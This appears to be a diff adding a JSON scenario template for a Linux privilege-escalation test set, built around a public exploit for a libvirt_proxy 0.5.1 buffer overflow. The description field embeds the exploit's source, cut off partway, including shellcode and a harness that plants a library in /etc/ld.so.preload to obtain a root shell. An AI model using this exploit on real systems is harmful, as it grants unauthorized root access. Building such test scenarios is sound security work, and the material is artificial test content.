@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_8534",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: libvirt_proxy 0.5.1 - Local Privilege Escalation (CVE-2009-0036;OSVDB-51866)\n\nExploit source code (8534.c):\n```\n/*\n * cve-2009-0036.c\n *\n * libvirt_proxy <= 0.5.1 Local Privilege Escalation Exploit\n * Jon Oberheide <jon@oberheide.org>\n * http://jon.oberheide.org\n *\n * Information:\n *\n *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0036\n *\n *   Buffer overflow in the proxyReadClientSocket function in\n *   proxy/libvirt_proxy.c in libvirt_proxy 0.5.1 might allow local users to\n *   gain privileges by sending a portion of the header of a virProxyPacket\n *   packet, and then sending the remainder of the packet with crafted values\n *   in the header, related to use of uninitialized memory in a validation\n *   check.\n *\n * Usage:\n *\n *   We're guessing to hit our NOP sled, so this program should be run in a\n *   harness.  Since the shellcode will execute /tmp/run as root, the following\n *   harness will insert a malicious getuid.so payload in /etc/ld.so.preload.\n *\n *   #!/bin/sh\n *\n *   echo \"[+] compiling the exploit\"\n *   gcc cve-2009-0036.c -o cve-2009-0036\n *\n *   echo \"[+] creating /tmp/getuid.so\"\n *   echo \"int getuid(){return 0;}\" > /tmp/getuid.c\n *   gcc -shared /tmp/getuid.c -o /tmp/getuid.so\n *\n *   echo \"[+] setting up /tmp/run\"\n *   echo -e \"#!/bin/sh\" > /tmp/run\n *   echo -e \"touch /tmp/success\" >> /tmp/run\n *   echo -e \"echo \\\"/tmp/getuid.so\\\" > /etc/ld.so.preload\" >> /tmp/run\n *   chmod +x /tmp/run\n *\n *   echo \"[+] starting exploit loop\"\n *   i=0\n *   rm -f /tmp/success\n *   while [ ! -e \"/tmp/success\" ]\n *   do\n *           i=$(($i+1))\n *           echo \"RUN NUMBER $i\"\n *           ./cve-2009-0036\n *   done\n *\n *   echo \"[+] our getuid.so is now in ld.so.preload\"\n *   echo \"[+] running su to obtain root shell\"\n *   su\n *\n * Notes:\n *\n *   Tested on Gentoo Linux 32-bit with GCC 4.3.3-r2 and randomize_va_space=1.\n *   We have a 4096 byte NOP sled before shellcode and EIP followed by 1000\n *   NOP/30 byte shellcode bundles until we cause a EFAULT in libvirt_proxy's\n *   read(2).  Our total sled is usually around 5k-10k NOPs so it'll take\n *   ~800-1600 tries on average to hit it and execute our shellcode.  Each run\n *   takes ~1 second, so exploitation will probably take 10-20 minutes on\n *   average.\n */\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#include <unistd.h>\n#include <errno.h>\n#include <signal.h>\n#include <sys/time.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <sys/un.h>\n\n#define PROXY_PATH \"/usr/libexec/libvirt_proxy\"\n#define PROXY_SOCKET_PATH \"/tmp/livirt_proxy_conn\"\n#define PROXY_PROTO_VERSION 1\n#define PROXY_PACKET_LENGTH 0xffff\n\n/* simple shellcode to execute /tmp/run */\nconst char shellcode[]=\n\t\"\\x31\\xdb\"\n\t\"\\x8d\\x43\\x17\"\n\t\"\\x99\"\n\t\"\\xcd\\x80\"\n\t\"\\x31\\xc9\"\n\t\"\\x51\"\n\t\"\\x68\\x2f\\x72\\x75\\x6e\"\n\t\"\\x68\\x2f\\x74\\x6d\\x70\"\n\t\"\\x8d\\x41\\x0b\"\n\t\"\\x89\\xe3\"\n\t\"\\xcd\\x80\";\n\nstruct proxy_packet {\n\tuint16_t version;\n\tuint16_t command;\n\tuint16_t serial;\n\tuint16_t len;\n};\n\nint\nmain(int argc, char **argv)\n{\n\tFILE *fp;\n\tlong ptr;\n\tint i, fd, pid, ret;\n        char *pkt, nop[65536];\n\tstruct sockaddr_un addr;\n\tstruct proxy_p\n```",
+  "cve": "CVE-2009-0036;OSVDB-51866",
+  "exploitdb_id": "8534",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_8534",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
